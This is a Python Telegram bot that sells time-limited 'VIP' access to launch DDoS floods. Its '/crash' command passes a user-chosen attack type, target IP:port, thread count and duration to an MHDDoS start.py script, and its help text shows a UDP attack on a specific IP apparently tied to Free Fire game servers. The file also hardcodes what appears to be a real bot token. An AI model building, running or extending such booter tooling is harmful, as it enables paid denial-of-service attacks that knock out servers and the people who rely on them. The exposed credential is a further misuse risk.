import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7822923778:AAHvlw9CnUjYM3qTaG3YDUyupiOw9h7HY7Q"
ADMIN_ID = 6821953959
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *Gói VIP của bạn đã hết hạn.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ KHÁCH HÀNG VIP!\n"
                f"⏳ Số ngày còn lại: {dias_restantes} dia(s)\n"
                f"📅 Hết hạn vào: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌ *Bạn không có gói VIP nào đang hoạt động.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 NGƯỜI BÁN - CHÍNH THỨC 💻",
        url=f"tg://user?id={ADMIN_ID}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "🤖 *CHÀO MỪNG ĐẾN VỚI CRASH BOT [Free Fire]!*"
            

            f"""
```
{vip_status}```\n"""
            "📌 *Como usar:*"
            """
```
/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "💡 *Ejemplo:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n"""
            "💠 Lizimin Modz 🇻🇳 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["vip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Bạn không phải là người bán được ủy quyền.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Định dạng không hợp lệ. Sử dụng: `/vip <ID> <QUANTOS DIAS>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ Tài khoản {telegram_id} được thêm vào như VIP bởi {days} ngày.")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ Bạn không có quyền sử dụng lệnh này.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ Quyền truy cập VIP của bạn đã hết hạn")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ Chờ 10 giây trước khi bắt đầu đòn tấn công tiếp theo và nhớ dừng đòn tấn công trước đó.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ Chờ 10 giây trước khi bắt đầu đòn tấn công tiếp theo và nhớ dừng đòn tấn công trước đó."
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Detener Ataque", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
            f"🌐 *Puerto:* {ip_port}\n"
            f"⚙️ *Tipo:* {attack_type}\n"
            f"🧟‍♀️ *Threads:* {threads}\n"
            f"⏳ *Tiempo (ms):* {duration}\n\n"
            f"💠 KrizzZModz 🇵🇪 USERS VIP 💠"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Chỉ có người dùng bắt đầu cuộc tấn công mới có thể dừng nó"
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Đòn tấn công đã bị đỡ thành công.")
        bot.edit_message_text(
            "*[⛔] KẾT THÚC CUỘC TẤN CÔNG[⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ No se encontro ningun ataque, siga con su acción.")

if __name__ == "__main__":
    bot.infinity_polling()
